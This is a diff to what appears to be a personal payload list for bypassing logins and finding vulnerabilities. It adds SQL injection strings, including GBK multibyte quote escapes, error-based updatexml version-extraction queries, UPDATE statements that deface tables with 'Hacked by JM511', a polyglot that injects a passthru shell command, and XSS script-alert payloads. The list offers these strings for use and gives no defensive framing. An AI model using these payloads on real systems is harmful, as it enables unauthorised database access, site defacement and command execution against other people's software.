@@ -1,5 +1,7 @@
 #Bypass login / find vuln : 
 
+縗' OR Admin=Admin /*
+縗' admin' or '1'='1
 *'like'
 admin' or '1'='1
 admin' or '1'='1'--
@@ -8,6 +10,7 @@ admin' or '1'='1'/*
 admin'or 1=1 or ''='
 admin') or ('1'='1
 admin" or "1"="1"--
+admin' or '1'='1--
 |
 |-[###############################################################################]-|
 |
@@ -60,8 +63,13 @@ UID=1;select+1&UID=2,3+from+users+where+id=1--
 |
 |-[###############################################################################]-|
 |
-#Bypass AIO:
+#Bypass AIO SQL / XSS :
 
+'and updatexml(0x3a,concat/*!(0x3a,version())*/,null)--+-
+1%bf%5c%27') and updatexml(0,concat(0x7e,version()),0)--+-
 ') having+1=1--
 ') update tblfilm SET titel='Hacked by JM511';--
 ') update uaefoot_foot SET titel='Hacked by JM511';-- 
+">><</>><</>><<...."><+_...<?>?><>/-!@#'Zero");echo passthru("pwd");exit;and updatexml(0x3a,concat/*!(0x3a,version())*/,null)--+-
+-->'>'/">'</'<'>'><SCRIPT> alert(String.fromCharCode(88, 83))</SCRIPT>--
+',',',',',',',',',',',','000)))))))!/?/*!*/'//--></SCRIPT>"'</'<'>'><SCRIPT> alert(String.fromCharCode(88, 83))</SCRIPT>--  1%bf%5c%27
